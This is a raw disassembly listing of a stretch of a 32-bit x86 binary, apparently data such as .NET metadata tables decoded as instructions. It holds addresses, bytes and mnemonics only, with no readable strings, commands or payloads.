  405cd4:	06                   	push   %es
  405cd5:	00 b7 15 21 06 0a    	add    %dh,0xa062115(%edi)
  405cdb:	00 ec                	add    %ch,%ah
  405cdd:	0e                   	push   %cs
  405cde:	f1                   	int1
  405cdf:	1e                   	push   %ds
  405ce0:	06                   	push   %es
  405ce1:	00 39                	add    %bh,(%ecx)
  405ce3:	1b 21                	sbb    (%ecx),%esp
  405ce5:	06                   	push   %es
  405ce6:	0a 00                	or     (%eax),%al
  405ce8:	0a 0f                	or     (%edi),%cl
  405cea:	f1                   	int1
  405ceb:	1e                   	push   %ds
  405cec:	06                   	push   %es
  405ced:	00 75 26             	add    %dh,0x26(%ebp)
  405cf0:	2b 00                	sub    (%eax),%eax
  405cf2:	16                   	push   %ss
  405cf3:	00 2a                	add    %ch,(%edx)
  405cf5:	20 08                	and    %cl,(%eax)
  405cf7:	0b 06                	or     (%esi),%eax
  405cf9:	00 f2                	add    %dh,%dl
  405cfb:	16                   	push   %ss
  405cfc:	2b 00                	sub    (%eax),%eax
  405cfe:	06                   	push   %es
  405cff:	00 bc 0e 21 06 06 00 	add    %bh,0x60621(%esi,%ecx,1)
  405d06:	6d                   	insl   (%dx),%es:(%edi)
  405d07:	18 21                	sbb    %ah,(%ecx)
  405d09:	06                   	push   %es
  405d0a:	06                   	push   %es
  405d0b:	00 b6 0d 21 06 06    	add    %dh,0x606210d(%esi)
  405d11:	00 17                	add    %dl,(%edi)
  405d13:	1e                   	push   %ds
  405d14:	21 06                	and    %eax,(%esi)
  405d16:	06                   	push   %es
  405d17:	00 2f                	add    %ch,(%edi)
  405d19:	1b 21                	sbb    (%ecx),%esp
  405d1b:	06                   	push   %es
  405d1c:	16                   	push   %ss
  405d1d:	00 48 1b             	add    %cl,0x1b(%eax)
  405d20:	04 1f                	add    $0x1f,%al
  405d22:	1a 00                	sbb    (%eax),%al
  405d24:	bd 1d ac 22 1a       	mov    $0x1a22ac1d,%ebp
  405d29:	00 53 1a             	add    %dl,0x1a(%ebx)
  405d2c:	ac                   	lods   %ds:(%esi),%al
  405d2d:	22 8b 01 49 1e 00    	and    0x1e4901(%ebx),%cl
  405d33:	00 1a                	add    %bl,(%edx)
  405d35:	00 91 21 ac 22 06    	add    %dl,0x622ac21(%ecx)
  405d3b:	00 d0                	add    %dl,%al
  405d3d:	1e                   	push   %ds
  405d3e:	df 18                	fistps (%eax)
  405d40:	06                   	push   %es
  405d41:	00 46 00             	add    %al,0x0(%esi)
  405d44:	df 18                	fistps (%eax)
  405d46:	06                   	push   %es
  405d47:	00 d6                	add    %dl,%dh
  405d49:	18 df                	sbb    %bl,%bh
  405d4b:	18 06                	sbb    %al,(%esi)
  405d4d:	00 68 00             	add    %ch,0x0(%eax)
  405d50:	df 18                	fistps (%eax)
  405d52:	06                   	push   %es
  405d53:	00 04 1d f3 25 06 00 	add    %al,0x625f3(,%ebx,1)
  405d5a:	0d 19 f3 25 06       	or     $0x625f319,%eax
  405d5f:	00 a3 0f df 18 06    	add    %ah,0x618df0f(%ebx)
  405d65:	00 76 19             	add    %dh,0x19(%esi)
  405d68:	df 18                	fistps (%eax)
  405d6a:	1e                   	push   %ds
  405d6b:	00 fc                	add    %bh,%ah
  405d6d:	19 7a 20             	sbb    %edi,0x20(%edx)
  405d70:	06                   	push   %es
  405d71:	00 ac 26 c8 17 06 00 	add    %ch,0x617c8(%esi,%eiz,1)
  405d78:	e2 17                	loop   0x405d91
  405d7a:	c8 17 06 00          	enter  $0x617,$0x0
  405d7e:	ca 0e c8             	lret   $0xc80e
  405d81:	17                   	pop    %ss
  405d82:	06                   	push   %es
  405d83:	00 10                	add    %dl,(%eax)
  405d85:	0c df                	or     $0xdf,%al
  405d87:	18 06                	sbb    %al,(%esi)
  405d89:	00 a8 0e 2a 14 0a    	add    %ch,0xa142a0e(%eax)
  405d8f:	00 d6                	add    %dl,%dh
  405d91:	1d 2b 00 0a 00       	sbb    $0xa002b,%eax
  405d96:	3a 21                	cmp    (%ecx),%ah
  405d98:	2b 00                	sub    (%eax),%eax
  405d9a:	06                   	push   %es
  405d9b:	00 4c 0d 2b          	add    %cl,0x2b(%ebp,%ecx,1)
  405d9f:	00 43 00             	add    %al,0x0(%ebx)
  405da2:	86 1e                	xchg   %bl,(%esi)
  405da4:	00 00                	add    %al,(%eax)
  405da6:	12 00                	adc    (%eax),%al
  405da8:	36 0e                	ss push %cs
  405daa:	8e 1c 06             	mov    (%esi,%eax,1),%ds
  405dad:	00 0b                	add    %cl,(%ebx)
  405daf:	00 ed                	add    %ch,%ch
  405db1:	0a 06                	or     (%esi),%al
  405db3:	00 9b 19 df 18 06    	add    %bl,0x618df19(%ebx)
  405db9:	00 37                	add    %dh,(%edi)
  405dbb:	26 27                	es daa
  405dbd:	1a 06                	sbb    (%esi),%al
  405dbf:	00 19                	add    %bl,(%ecx)
  405dc1:	10 df                	adc    %bl,%bh
  405dc3:	18 06                	sbb    %al,(%esi)
  405dc5:	00 91 1e df 18 06    	add    %dl,0x618df1e(%ecx)
  405dcb:	00 84 0e df 18 22 00 	add    %al,0x2218df(%esi,%ecx,1)
  405dd2:	55                   	push   %ebp
  405dd3:	1b 5d 1d             	sbb    0x1d(%ebp),%ebx
  405dd6:	22 00                	and    (%eax),%al
  405dd8:	00 20                	add    %ah,(%eax)
  405dda:	5d                   	pop    %ebp
  405ddb:	1d 22 00 84 1d       	sbb    $0x1d840022,%eax
  405de0:	5d                   	pop    %ebp
  405de1:	1d 12 00 7c 1d       	sbb    $0x1d7c0012,%eax
  405de6:	41                   	inc    %ecx
  405de7:	1f                   	pop    %ds
  405de8:	22 00                	and    (%eax),%al
  405dea:	18 20                	sbb    %ah,(%eax)
  405dec:	5d                   	pop    %ebp
  405ded:	1d 06 00 d7 1f       	sbb    $0x1fd70006,%eax
  405df2:	f3 25 06 00 a8 1a    	repz and $0x1aa80006,%eax
  405df8:	df 18                	fistps (%eax)
  405dfa:	06                   	push   %es
  405dfb:	00 de                	add    %bl,%dh
  405dfd:	1f                   	pop    %ds
  405dfe:	f3 25 12 00 36 1d    	repz and $0x1d360012,%eax
  405e04:	f3 25 06 00 90 18    	repz and $0x18900006,%eax
  405e0a:	f3 25 06 00 7f 00    	repz and $0x7f0006,%eax
  405e10:	f3 25 06 00 92 1a    	repz and $0x1a920006,%eax
  405e16:	df 18                	fistps (%eax)
  405e18:	06                   	push   %es
  405e19:	00 e6                	add    %ah,%dh
  405e1b:	18 f3                	sbb    %dh,%bl
  405e1d:	25 06 00 fb 0d       	and    $0xdfb0006,%eax
  405e22:	f3 25 06 00 bf 0d    	repz and $0xdbf0006,%eax
  405e28:	f3 25 06 00 27 19    	repz and $0x19270006,%eax
  405e2e:	f3 25 06 00 da 0d    	repz and $0xdda0006,%eax
  405e34:	f3 25 06 00 7b 1a    	repz and $0x1a7b0006,%eax
  405e3a:	f3 25 06 00 9a 1d    	repz and $0x1d9a0006,%eax
  405e40:	df 18                	fistps (%eax)
  405e42:	06                   	push   %es
  405e43:	00 84 25 df 18 06 00 	add    %al,0x618df(%ebp,%eiz,1)
  405e4a:	d3 20                	shll   %cl,(%eax)
  405e4c:	41                   	inc    %ecx
  405e4d:	1f                   	pop    %ds
  405e4e:	06                   	push   %es
  405e4f:	00 61 0e             	add    %ah,0xe(%ecx)
  405e52:	df 18                	fistps (%eax)
  405e54:	06                   	push   %es
  405e55:	00 d0                	add    %dl,%al
  405e57:	0b f3                	or     %ebx,%esi
  405e59:	25 06 00 5f 00       	and    $0x5f0006,%eax
  405e5e:	df 18                	fistps (%eax)
  405e60:	06                   	push   %es
  405e61:	00 4f 0e             	add    %cl,0xe(%edi)
  405e64:	df 18                	fistps (%eax)
  405e66:	06                   	push   %es
  405e67:	00 b5 0e df 18 06    	add    %dh,0x618df0e(%ebp)
  405e6d:	00 f2                	add    %dh,%dl
  405e6f:	20 21                	and    %ah,(%ecx)
  405e71:	06                   	push   %es
  405e72:	06                   	push   %es
  405e73:	00 1e                	add    %bl,(%esi)
  405e75:	10 21                	adc    %ah,(%ecx)
  405e77:	06                   	push   %es
  405e78:	0a 00                	or     (%eax),%al
  405e7a:	9d                   	popf
  405e7b:	18 e6                	sbb    %ah,%dh
  405e7d:	19 0a                	sbb    %ecx,(%edx)
  405e7f:	00 eb                	add    %ch,%bl
  405e81:	0d e6 19 00 00       	or     $0x19e6,%eax
  405e86:	00 00                	add    %al,(%eax)
  405e88:	93                   	xchg   %eax,%ebx
  405e89:	00 00                	add    %al,(%eax)
  405e8b:	00 00                	add    %al,(%eax)
  405e8d:	00 01                	add    %al,(%ecx)
  405e8f:	00 01                	add    %al,(%ecx)
  405e91:	00 01                	add    %al,(%ecx)
  405e93:	00 10                	add    %dl,(%eax)
  405e95:	00 a1 09 d9 02 05    	add    %ah,0x502d909(%ecx)
  405e9b:	00 01                	add    %al,(%ecx)
  405e9d:	00 01                	add    %al,(%ecx)
  405e9f:	00 81 01 10 00 ef    	add    %al,-0x10ffefff(%ecx)
  405ea5:	1b d9                	sbb    %ecx,%ebx
  405ea7:	02 05 00 01 00 03    	add    0x3000100,%al
  405ead:	00 81 01 10 00 e9    	add    %al,-0x16ffefff(%ecx)
  405eb3:	24 9f                	and    $0x9f,%al
  405eb5:	04 05                	add    $0x5,%al
  405eb7:	00 13                	add    %dl,(%ebx)
  405eb9:	00 06                	add    %al,(%esi)
  405ebb:	00 00                	add    %al,(%eax)
  405ebd:	00 10                	add    %dl,(%eax)
  405ebf:	00 e1                	add    %ah,%cl
  405ec1:	26 49                	es dec %ecx
  405ec3:	24 05                	and    $0x5,%al
  405ec5:	00 1e                	add    %bl,(%esi)
  405ec7:	00 24 00             	add    %ah,(%eax,%eax,1)
  405eca:	00 00                	add    %al,(%eax)
  405ecc:	10 00                	adc    %al,(%eax)
  405ece:	4c                   	dec    %esp
  405ecf:	13 e1                	adc    %ecx,%esp
  405ed1:	03 05 00 1e 00 26    	add    0x26001e00,%eax
  405ed7:	00 81 01 10 00 b3    	add    %al,-0x4cffefff(%ecx)
  405edd:	06                   	push   %es
  405ede:	e1 03                	loope  0x405ee3
  405ee0:	05 00 1e 00 2d       	add    $0x2d001e00,%eax
  405ee5:	00 81 01 10 00 eb    	add    %al,-0x14ffefff(%ecx)
  405eeb:	00 e1                	add    %ah,%cl
  405eed:	03 05 00 1e 00 2f    	add    0x2f001e00,%eax
  405ef3:	00 81 01 10 00 85    	add    %al,-0x7affefff(%ecx)
  405ef9:	02 e1                	add    %cl,%ah
  405efb:	03 05 00 1e 00 30    	add    0x30001e00,%eax
  405f01:	00 81 01 10 00 79    	add    %al,0x79001001(%ecx)
  405f07:	02 e1                	add    %cl,%ah
  405f09:	03 05 00 1e 00 36    	add    0x36001e00,%eax
  405f0f:	00 81 01 10 00 e9    	add    %al,-0x16ffefff(%ecx)
  405f15:	08 e1                	or     %ah,%cl
  405f17:	03 05 00 1f 00 38    	add    0x38001f00,%eax
  405f1d:	00 02                	add    %al,(%edx)
  405f1f:	01 00                	add    %eax,(%eax)
  405f21:	00 e5                	add    %ah,%ch
  405f23:	06                   	push   %es
  405f24:	00 00                	add    %al,(%eax)
  405f26:	39 00                	cmp    %eax,(%eax)
  405f28:	1f                   	pop    %ds
  405f29:	00 3e                	add    %bh,(%esi)
  405f2b:	00 81 01 10 00 f4    	add    %al,-0xbffefff(%ecx)
  405f31:	01 e1                	add    %esp,%ecx
  405f33:	03 05 00 23 00 3e    	add    0x3e002300,%eax
  405f39:	00 81 01 10 00 7c    	add    %al,0x7c001001(%ecx)
  405f3f:	0d e1 03 05 00       	or     $0x503e1,%eax
  405f44:	23 00                	and    (%eax),%eax
  405f46:	41                   	inc    %ecx
  405f47:	00 81 01 10 00 61    	add    %al,0x61001001(%ecx)
  405f4d:	18 81 07 05 00 24    	sbb    %al,0x24000507(%ecx)
  405f53:	00 46 00             	add    %al,0x0(%esi)
  405f56:	83 01 10             	addl   $0x10,(%ecx)
  405f59:	00 d1                	add    %dl,%cl
  405f5b:	24 00                	and    $0x0,%al
  405f5d:	00 05 00 25 00 4b    	add    %al,0x4b002500
  405f63:	00 01                	add    %al,(%ecx)
  405f65:	00 10                	add    %dl,(%eax)
  405f67:	00 61 24             	add    %ah,0x24(%ecx)
  405f6a:	9c                   	pushf
  405f6b:	00 05 00 26 00 4b    	add    %al,0x4b002600
  405f71:	00 81 01 10 00 be    	add    %al,-0x41ffefff(%ecx)
  405f77:	05 9c 00 05 00       	add    $0x5009c,%eax
  405f7c:	2d 00 52 00 00       	sub    $0x5200,%eax
  405f81:	01 00                	add    %eax,(%eax)
  405f83:	00 ae 09 00 00 05    	add    %ch,0x5000009(%esi)
  405f89:	00 2d 00 54 00 13    	add    %ch,0x13005400
  405f8f:	01 00                	add    %eax,(%eax)
  405f91:	00 46 25             	add    %al,0x25(%esi)
  405f94:	00 00                	add    %al,(%eax)
  405f96:	51                   	push   %ecx
  405f97:	00 2e                	add    %ch,(%esi)
  405f99:	00 54 00 01          	add    %dl,0x1(%eax,%eax,1)
  405f9d:	00 10                	add    %dl,(%eax)
  405f9f:	00 27                	add    %ah,(%edi)
  405fa1:	04 c6                	add    $0xc6,%al
  405fa3:	07                   	pop    %es
  405fa4:	05 00 2e 00 54       	add    $0x54002e00,%eax
  405fa9:	00 01                	add    %al,(%ecx)
  405fab:	00 10                	add    %dl,(%eax)
  405fad:	00 d5                	add    %dl,%ch
  405faf:	1a c6                	sbb    %dh,%al
  405fb1:	07                   	pop    %es
  405fb2:	05 00 2f 00 5f       	add    $0x5f002f00,%eax
  405fb7:	00 01                	add    %al,(%ecx)
  405fb9:	00 10                	add    %dl,(%eax)
  405fbb:	00 49 17             	add    %cl,0x17(%ecx)
  405fbe:	c6 07 05             	movb   $0x5,(%edi)
  405fc1:	00 31                	add    %dh,(%ecx)
  405fc3:	00 63 00             	add    %ah,0x0(%ebx)
  405fc6:	01 00                	add    %eax,(%eax)
  405fc8:	10 00                	adc    %al,(%eax)
  405fca:	ad                   	lods   %ds:(%esi),%eax
  405fcb:	04 c6                	add    $0xc6,%al
  405fcd:	07                   	pop    %es
  405fce:	05 00 33 00 6a       	add    $0x6a003300,%eax
  405fd3:	00 01                	add    %al,(%ecx)
  405fd5:	01 00                	add    %eax,(%eax)
  405fd7:	00 28                	add    %ch,(%eax)
  405fd9:	05 c6 07 39 00       	add    $0x3907c6,%eax
  405fde:	3a 00                	cmp    (%eax),%al
  405fe0:	95                   	xchg   %eax,%ebp
  405fe1:	00 00                	add    %al,(%eax)
  405fe3:	00 10                	add    %dl,(%eax)
  405fe5:	00 cf                	add    %cl,%bh
  405fe7:	00 c6                	add    %al,%dh
  405fe9:	07                   	pop    %es
  405fea:	05 00 47 00 95       	add    $0x95004700,%eax
  405fef:	00 00                	add    %al,(%eax)
  405ff1:	00 10                	add    %dl,(%eax)
  405ff3:	00 cc                	add    %cl,%ah
  405ff5:	09 c6                	or     %eax,%esi
  405ff7:	07                   	pop    %es
  405ff8:	05 00 47 00 99       	add    $0x99004700,%eax
  405ffd:	00 81 01 10 00 14    	add    %al,0x14001001(%ecx)
  406003:	0a c6                	or     %dh,%al
  406005:	07                   	pop    %es
  406006:	05 00 47 00 a2       	add    $0xa2004700,%eax
  40600b:	00 00                	add    %al,(%eax)
  40600d:	01 00                	add    %eax,(%eax)
  40600f:	00 4a 03             	add    %cl,0x3(%edx)
  406012:	00 00                	add    %al,(%eax)
  406014:	05 00 47 00 a4       	add    $0xa4004700,%eax
  406019:	00 13                	add    %dl,(%ebx)
  40601b:	01 00                	add    %eax,(%eax)
  40601d:	00 e3                	add    %ah,%bl
  40601f:	07                   	pop    %es
  406020:	00 00                	add    %al,(%eax)
  406022:	51                   	push   %ecx
  406023:	00 48 00             	add    %cl,0x0(%eax)
  406026:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406027:	00 16                	add    %dl,(%esi)
  406029:	00 d6                	add    %dl,%dh
  40602b:	13 12                	adc    (%edx),%edx
  40602d:	00 16                	add    %dl,(%esi)
  40602f:	00 f2                	add    %dh,%dl
  406031:	15 12 00 16 00       	adc    $0x160012,%eax
  406036:	3d 0a 12 00 16       	cmp    $0x1600120a,%eax
  40603b:	00 2b                	add    %ch,(%ebx)
  40603d:	26 12 00             	adc    %es:(%eax),%al
  406040:	16                   	push   %ss
  406041:	00 08                	add    %cl,(%eax)
  406043:	08 12                	or     %dl,(%edx)
  406045:	00 16                	add    %dl,(%esi)
  406047:	00 a1 13 12 00 16    	add    %ah,0x16001213(%ecx)
  40604d:	00 66 1c             	add    %ah,0x1c(%esi)
  406050:	12 00                	adc    (%eax),%al
  406052:	16                   	push   %ss
  406053:	00 5e 0a             	add    %bl,0xa(%esi)
  406056:	12 00                	adc    (%eax),%al
  406058:	16                   	push   %ss
  406059:	00 93 1b 12 00 16    	add    %dl,0x1600121b(%ebx)
  40605f:	00 93 0a 12 00 16    	add    %dl,0x1600120a(%ebx)
  406065:	00 79 0a             	add    %bh,0xa(%ecx)
  406068:	15 00 16 00 ca       	adc    $0xca001600,%eax
  40606d:	23 12                	and    (%edx),%edx
  40606f:	00 16                	add    %dl,(%esi)
  406071:	00 05 0a 19 00 16    	add    %al,0x1600190a
  406077:	00 1f                	add    %bl,(%edi)
  406079:	03 12                	add    (%edx),%edx
  40607b:	00 16                	add    %dl,(%esi)
  40607d:	00 86 0a 12 00 16    	add    %al,0x1600120a(%esi)
  406083:	00 b8 07 12 00 16    	add    %bh,0x16001207(%eax)
  406089:	00 2f                	add    %ch,(%edi)
  40608b:	0a 12                	or     (%edx),%dl
  40608d:	00 16                	add    %dl,(%esi)
  40608f:	00 1d 17 12 00 11    	add    %bl,0x11001217
  406095:	00 2a                	add    %ch,(%edx)
  406097:	0d 21 00 11 00       	or     $0x110021,%eax
  40609c:	0f 0d 25 00 11 00 df 	prefetch 0xdf001100
  4060a3:	0c 29                	or     $0x29,%al
  4060a5:	00 11                	add    %dl,(%ecx)
  4060a7:	00 75 0c             	add    %dh,0xc(%ebp)
  4060aa:	2d 00 11 00 f7       	sub    $0xf7001100,%eax
  4060af:	0c 2d                	or     $0x2d,%al
  4060b1:	00 11                	add    %dl,(%ecx)
  4060b3:	00 5a 0c             	add    %bl,0xc(%edx)
  4060b6:	30 00                	xor    %al,(%eax)
  4060b8:	11 00                	adc    %eax,(%eax)
  4060ba:	3d 0c 34 00 31       	cmp    $0x3100340c,%eax
  4060bf:	00 23                	add    %ah,(%ebx)
  4060c1:	0c 37                	or     $0x37,%al
  4060c3:	00 11                	add    %dl,(%ecx)
  4060c5:	00 91 0c 30 00 11    	add    %dl,0x1100300c(%ecx)
  4060cb:	00 c5                	add    %al,%ch
  4060cd:	0c 3a                	or     $0x3a,%al
  4060cf:	00 11                	add    %dl,(%ecx)
  4060d1:	00 a7 0c 34 00 16    	add    %ah,0x1600340c(%edi)
  4060d7:	00 6e 09             	add    %ch,0x9(%esi)
  4060da:	dc 00                	faddl  (%eax)
  4060dc:	06                   	push   %es
  4060dd:	06                   	push   %es
  4060de:	48                   	dec    %eax
  4060df:	0a 06                	or     (%esi),%al
  4060e1:	01 56 80             	add    %edx,-0x80(%esi)
  4060e4:	45                   	inc    %ebp
  4060e5:	06                   	push   %es
  4060e6:	09 01                	or     %eax,(%ecx)
  4060e8:	56                   	push   %esi
  4060e9:	80 a3 02 09 01 56 80 	andb   $0x80,0x56010902(%ebx)
  4060f0:	45                   	inc    %ebp
  4060f1:	18 09                	sbb    %cl,(%ecx)
  4060f3:	01 31                	add    %esi,(%ecx)
  4060f5:	00 a5 16 12 00 16    	add    %ah,0x16001216(%ebp)
  4060fb:	00 05 16 30 01 16    	add    %al,0x16013016
  406101:	00 71 24             	add    %dh,0x24(%ecx)
  406104:	43                   	inc    %ebx
  406105:	01 51 80             	add    %edx,-0x80(%ecx)
  406108:	fb                   	sti
  406109:	1a 3a                	sbb    (%edx),%bh
  40610b:	00 51 80             	add    %dl,-0x80(%ecx)
  40610e:	5a                   	pop    %edx
  40610f:	02 3a                	add    (%edx),%bh
  406111:	00 51 80             	add    %dl,-0x80(%ecx)
  406114:	c2 00 3a             	ret    $0x3a00
  406117:	00 51 80             	add    %dl,-0x80(%ecx)
  40611a:	df 0a                	fisttps (%edx)
  40611c:	3a 00                	cmp    (%eax),%al
  40611e:	21 00                	and    %eax,(%eax)
  406120:	bc 01 29 00 21       	mov    $0x21002901,%esp
  406125:	00 69 19             	add    %ch,0x19(%ecx)
  406128:	29 00                	sub    %eax,(%eax)
  40612a:	31 00                	xor    %eax,(%eax)
  40612c:	18 07                	sbb    %al,(%edi)
  40612e:	29 00                	sub    %eax,(%eax)
  406130:	33 01                	xor    (%ecx),%eax
  406132:	89 0b                	mov    %ecx,(%ebx)
  406134:	8b 01                	mov    (%ecx),%eax
  406136:	11 00                	adc    %eax,(%eax)
  406138:	57                   	push   %edi
  406139:	16                   	push   %ss
  40613a:	8f 01                	pop    (%ecx)
  40613c:	01 00                	add    %eax,(%eax)
  40613e:	14 13                	adc    $0x13,%al
  406140:	30 01                	xor    %al,(%ecx)
  406142:	01 00                	add    %eax,(%eax)
  406144:	88 0d 3a 00 01 00    	mov    %cl,0x1003a
  40614a:	14 13                	adc    $0x13,%al
  40614c:	30 01                	xor    %al,(%ecx)
  40614e:	01 00                	add    %eax,(%eax)
  406150:	d5 04                	aad    $0x4
  406152:	c7 01 01 00 19 05    	movl   $0x5190001,(%ecx)
  406158:	12 00                	adc    (%eax),%al
  40615a:	01 00                	add    %eax,(%eax)
  40615c:	a8 03                	test   $0x3,%al
  40615e:	12 00                	adc    (%eax),%al
  406160:	01 00                	add    %eax,(%eax)
  406162:	b8 03 37 00 01       	mov    $0x1003703,%eax
  406167:	00 95 05 02 02 01    	add    %dl,0x1020205(%ebp)
  40616d:	00 54 24 c7          	add    %dl,-0x39(%esp)
  406171:	01 01                	add    %eax,(%ecx)
  406173:	00 14 13             	add    %dl,(%ebx,%edx,1)
  406176:	30 01                	xor    %al,(%ecx)
  406178:	01 00                	add    %eax,(%eax)
  40617a:	e4 25                	in     $0x25,%al
  40617c:	06                   	push   %es
  40617d:	02 06                	add    (%esi),%al
  40617f:	06                   	push   %es
  406180:	48                   	dec    %eax
  406181:	0a 3a                	or     (%edx),%bh
  406183:	00 56 80             	add    %dl,-0x80(%esi)
  406186:	7e 19                	jle    0x4061a1
  406188:	02 02                	add    (%edx),%al
  40618a:	56                   	push   %esi
  40618b:	80 c5 08             	add    $0x8,%ch
  40618e:	02 02                	add    (%edx),%al
  406190:	56                   	push   %esi
  406191:	80 b0 05 02 02 56 80 	xorb   $0x80,0x56020205(%eax)
  406198:	a2 05 02 02 56       	mov    %al,0x56020205
  40619d:	80 7c 16 02 02       	cmpb   $0x2,0x2(%esi,%edx,1)
  4061a2:	56                   	push   %esi
  4061a3:	80 d5 15             	adc    $0x15,%ch
  4061a6:	02 02                	add    (%edx),%al
  4061a8:	56                   	push   %esi
  4061a9:	80 e2 15             	and    $0x15,%dl
  4061ac:	02 02                	add    (%edx),%al
  4061ae:	56                   	push   %esi
  4061af:	80 70 06 02          	xorb   $0x2,0x6(%eax)
  4061b3:	02 56 80             	add    -0x80(%esi),%dl
  4061b6:	5c                   	pop    %esp
  4061b7:	13 02                	adc    (%edx),%eax
  4061b9:	02 56 80             	add    -0x80(%esi),%dl
  4061bc:	7b 06                	jnp    0x4061c4
  4061be:	02 02                	add    (%edx),%al
  4061c0:	56                   	push   %esi
  4061c1:	80 00 05             	addb   $0x5,(%eax)
  4061c4:	02 02                	add    (%edx),%al
  4061c6:	56                   	push   %esi
  4061c7:	80 23 08             	andb   $0x8,(%ebx)
  4061ca:	02 02                	add    (%edx),%al
  4061cc:	33 01                	xor    (%ecx),%eax
  4061ce:	4f                   	dec    %edi
  4061cf:	07                   	pop    %es
  4061d0:	fd                   	std
  4061d1:	02 08                	add    (%eax),%cl
  4061d3:	26 00 00             	add    %al,%es:(%eax)
  4061d6:	00 00                	add    %al,(%eax)
  4061d8:	96                   	xchg   %eax,%esi
  4061d9:	00 8c 19 0a 00 01 00 	add    %cl,0x1000a(%ecx,%ebx,1)
  4061e0:	78 20                	js     0x406202
  4061e2:	00 00                	add    %al,(%eax)
  4061e4:	00 00                	add    %al,(%eax)
  4061e6:	86 18                	xchg   %bl,(%eax)
  4061e8:	9b                   	fwait
  4061e9:	1e                   	push   %ds
  4061ea:	0e                   	push   %cs
  4061eb:	00 01                	add    %al,(%ecx)
  4061ed:	00 f8                	add    %bh,%al
  4061ef:	26 00 00             	add    %al,%es:(%eax)
  4061f2:	00 00                	add    %al,(%eax)
  4061f4:	96                   	xchg   %eax,%esi
  4061f5:	00 f2                	add    %dh,%dl
  4061f7:	07                   	pop    %es
  4061f8:	1d 00 01 00 50       	sbb    $0x50000100,%eax
  4061fd:	28 00                	sub    %al,(%eax)
  4061ff:	00 00                	add    %al,(%eax)
  406201:	00 91 00 26 07 1d    	add    %dl,0x1d072600(%ecx)
  406207:	00 01                	add    %al,(%ecx)
  406209:	00 c0                	add    %al,%al
  40620b:	28 00                	sub    %al,(%eax)
  40620d:	00 00                	add    %al,(%eax)
  40620f:	00 91 18 a1 1e 0a    	add    %dl,0xa1ea118(%ecx)
  406215:	00 01                	add    %al,(%ecx)
  406217:	00 80 20 00 00 00    	add    %al,0x20(%eax)
  40621d:	00 96 08 7b 22 3d    	add    %dl,0x3d227b08(%esi)
  406223:	00 01                	add    %al,(%ecx)
  406225:	00 87 20 00 00 00    	add    %al,0x20(%edi)
  40622b:	00 96 08 89 22 42    	add    %dl,0x42228908(%esi)
  406231:	00 01                	add    %al,(%ecx)
  406233:	00 8f 20 00 00 00    	add    %cl,0x20(%edi)
  406239:	00 96 08 5f 22 48    	add    %dl,0x48225f08(%esi)
  40623f:	00 02                	add    %al,(%edx)
  406241:	00 96 20 00 00 00    	add    %dl,0x20(%esi)
  406247:	00 96 08 6d 22 4d    	add    %dl,0x4d226d08(%esi)
  40624d:	00 02                	add    %al,(%edx)
  40624f:	00 9e 20 00 00 00    	add    %bl,0x20(%esi)
  406255:	00 91 08 8b 1d 53    	add    %dl,0x531d8b08(%ecx)
  40625b:	00 03                	add    %al,(%ebx)
  40625d:	00 a5 20 00 00 00    	add    %ah,0x20(%ebp)
  406263:	00 91 08 96 1d 58    	add    %dl,0x581d9608(%ecx)
  406269:	00 03                	add    %al,(%ebx)
  40626b:	00 ad 20 00 00 00    	add    %ch,0x20(%ebp)
  406271:	00 91 08 c1 12 5e    	add    %dl,0x5e12c108(%ecx)
  406277:	00 04 00             	add    %al,(%eax,%eax,1)
  40627a:	b4 20                	mov    $0x20,%ah
  40627c:	00 00                	add    %al,(%eax)
  40627e:	00 00                	add    %al,(%eax)
  406280:	91                   	xchg   %eax,%ecx
  406281:	08 d0                	or     %dl,%al
  406283:	12 62 00             	adc    0x0(%edx),%ah
  406286:	04 00                	add    $0x0,%al
  406288:	bc 20 00 00 00       	mov    $0x20,%esp
  40628d:	00 91 08 07 22 5e    	add    %dl,0x5e220708(%ecx)
  406293:	00 05 00 c3 20 00    	add    %al,0x20c300
  406299:	00 00                	add    %al,(%eax)
  40629b:	00 91 08 12 22 62    	add    %dl,0x62221208(%ecx)
  4062a1:	00 05 00 cb 20 00    	add    %al,0x20cb00
  4062a7:	00 00                	add    %al,(%eax)
  4062a9:	00 91 08 66 12 67    	add    %dl,0x67126608(%ecx)
  4062af:	00 06                	add    %al,(%esi)
  4062b1:	00 d2                	add    %dl,%dl
  4062b3:	20 00                	and    %al,(%eax)
  4062b5:	00 00                	add    %al,(%eax)
  4062b7:	00 91 08 74 12 6c    	add    %dl,0x6c127408(%ecx)
  4062bd:	00 06                	add    %al,(%esi)
  4062bf:	00 da                	add    %bl,%dl
  4062c1:	20 00                	and    %al,(%eax)
  4062c3:	00 00                	add    %al,(%eax)
  4062c5:	00 96 08 ec 0b 1d    	add    %dl,0x1d0bec08(%esi)
  4062cb:	00 07                	add    %al,(%edi)
  4062cd:	00 e1                	add    %ah,%cl
  4062cf:	20 00                	and    %al,(%eax)
  4062d1:	00 00                	add    %al,(%eax)
  4062d3:	00 96 08 fc 0b 72    	add    %dl,0x720bfc08(%esi)
  4062d9:	00 07                	add    %al,(%edi)
  4062db:	00 e9                	add    %ch,%cl
  4062dd:	20 00                	and    %al,(%eax)
  4062df:	00 00                	add    %al,(%eax)
  4062e1:	00 91 08 1e 0b 77    	add    %dl,0x770b1e08(%ecx)
  4062e7:	00 08                	add    %cl,(%eax)
  4062e9:	00 f0                	add    %dh,%al
  4062eb:	20 00                	and    %al,(%eax)
  4062ed:	00 00                	add    %al,(%eax)
  4062ef:	00 91 08 18 14 67    	add    %dl,0x67141808(%ecx)
  4062f5:	00 08                	add    %cl,(%eax)
  4062f7:	00 f7                	add    %dh,%bh
  4062f9:	20 00                	and    %al,(%eax)
  4062fb:	00 00                	add    %al,(%eax)
  4062fd:	00 91 08 21 14 6c    	add    %dl,0x6c142108(%ecx)
  406303:	00 08                	add    %cl,(%eax)
  406305:	00 ff                	add    %bh,%bh
  406307:	20 00                	and    %al,(%eax)
  406309:	00 00                	add    %al,(%eax)
  40630b:	00 96 08 f3 17 7b    	add    %dl,0x7b17f308(%esi)
  406311:	00 09                	add    %cl,(%ecx)
  406313:	00 06                	add    %al,(%esi)
  406315:	21 00                	and    %eax,(%eax)
  406317:	00 00                	add    %al,(%eax)
  406319:	00 96 08 00 18 7f    	add    %dl,0x7f180008(%esi)
  40631f:	00 09                	add    %cl,(%ecx)
  406321:	00 0e                	add    %cl,(%esi)
  406323:	21 00                	and    %eax,(%eax)
  406325:	00 00                	add    %al,(%eax)
  406327:	00 96 08 0c 15 1d    	add    %dl,0x1d150c08(%esi)
